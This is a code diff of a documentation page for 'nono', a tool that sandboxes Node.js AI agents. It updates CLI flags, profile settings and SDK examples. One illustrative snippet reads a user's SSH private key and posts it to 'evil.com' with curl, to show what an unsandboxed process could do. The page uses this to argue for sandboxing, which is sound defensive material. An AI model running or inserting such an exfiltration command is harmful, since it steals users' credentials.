@@ -49,19 +49,19 @@ const relatedPages = [
 ];
 
 const cliCode = `# Sandbox a Node.js AI agent with read-write to the project
-nono run --allow . -- node agent.js
+nono run --allow-cwd -- node agent.js
 
-# Sandbox Claude Code (Node.js-based)
-nono run --allow . --group node_runtime -- claude
+# Sandbox Claude Code with the built-in profile
+nono run --profile claude-code --allow-cwd -- claude
 
-# Block all network access
-nono run --allow . --net-block -- node server.js
+# Restrict network to LLM API endpoints only
+nono run --allow-cwd --network-profile minimal -- node agent.js
 
-# Use the built-in node_runtime security group
-nono run --allow . --group node_runtime -- npm run build
+# Use a profile with the node_runtime security group
+nono run --profile node-agent.json --allow-cwd -- npm run build
 
 # Sandbox an npm install to the project only
-nono run --allow . --group node_runtime -- npm install`;
+nono run --profile node-agent.json --allow-cwd -- npm install`;
 
 const profileCode = `{
   "meta": {
@@ -76,7 +76,9 @@ const profileCode = `{
     "allow": ["$HOME/.npm"],
     "read_file": ["$HOME/.gitconfig"]
   },
-  "network": { "block": false },
+  "network": {
+    "allow_hosts": ["api.openai.com", "api.anthropic.com"]
+  },
   "workdir": { "access": "readwrite" },
   "undo": {
     "exclude_patterns": ["node_modules", ".next", "dist"]
@@ -84,37 +86,39 @@ const profileCode = `{
   "interactive": false
 }`;
 
-const sdkCode = `import { CapabilitySet, SandboxState } from "nono-ts";
+const sdkCode = `import { CapabilitySet, AccessMode, apply } from 'nono-ts';
+import { execSync } from 'child_process';
 
 // Build a capability set programmatically
 const caps = new CapabilitySet();
-caps.allowReadWrite("./workspace");
-caps.allowRead("./config");
+caps.allowPath('./workspace', AccessMode.ReadWrite);
+caps.allowFile('./config.json', AccessMode.Read);
 caps.blockNetwork();
 
 // Apply — irrevocable after this call
-caps.apply();
+apply(caps);
 
 // Everything after this runs inside the sandbox
 // child_process, fs, net — all restricted
-import { execSync } from "child_process";
-execSync("node worker.js");
+execSync('node worker.js');
 // worker.js inherits the same restrictions`;
 
 const childProcessCode = `// Without nono: child_process inherits full user permissions
 const { execSync } = require("child_process");
 const fs = require("fs");
 
-// Read SSH key and send it anywhere
 const key = fs.readFileSync("/home/user/.ssh/id_rsa", "utf8");
 execSync(\`curl -X POST https://evil.com/exfil -d '\${key}'\`);
 // This works. Nothing stops it.
 
 // With nono: kernel denies access at the syscall level
-// $ nono run --allow ./project -- node agent.js
-const key = fs.readFileSync("/home/user/.ssh/id_rsa", "utf8");
-// Error: EACCES: permission denied, open '/home/user/.ssh/id_rsa'
-// The file is invisible to the sandboxed process.`;
+// $ nono run --allow-cwd -- node agent.js
+try {
+  fs.readFileSync("/home/user/.ssh/id_rsa", "utf8");
+} catch (err) {
+  // EACCES: permission denied — kernel blocked the syscall
+}
+// The file is inaccessible to the sandboxed process.`;
 
 export default function NodeSandboxPage() {
   return (
